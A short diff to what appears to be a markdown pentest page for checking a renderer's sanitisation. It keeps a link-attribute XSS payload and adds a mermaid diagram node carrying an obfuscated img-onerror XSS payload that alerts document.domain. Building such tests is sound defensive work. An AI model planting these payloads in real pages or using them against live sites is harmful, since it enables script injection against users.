@@ -19,7 +19,11 @@ pentest
 
 [malicious link](something"onmouseover="alert('XSS'))
 
-
+## XSS Test
+ ```mermaid
+  graph LR
+      B-->D(<img onerror=location=`javascript\u003aalert\u0028document.domain\u0029` src=x>);
+ ```
 
 ## iFrames Test
 
